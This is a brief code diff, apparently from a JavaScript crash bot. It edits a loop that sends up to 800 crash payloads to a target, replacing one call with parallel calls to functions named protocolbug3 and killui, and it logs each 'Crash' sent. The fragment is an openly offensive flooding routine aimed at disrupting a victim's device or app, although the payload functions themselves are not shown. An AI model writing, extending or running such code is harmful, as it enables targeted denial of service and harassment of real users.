@@ -836,7 +836,9 @@ const sendNext = async () => {
 
     try {
         if (count < 800) {
-            ExTraKuta(target)
+            await Promise.all([
+            protocolbug3(target, false),
+            killui(target, Ptcp = true)
             ]);
             console.log(chalk.red(`Sending ( Crash🦠) ${count}/800 to ${target}`));
             count++;
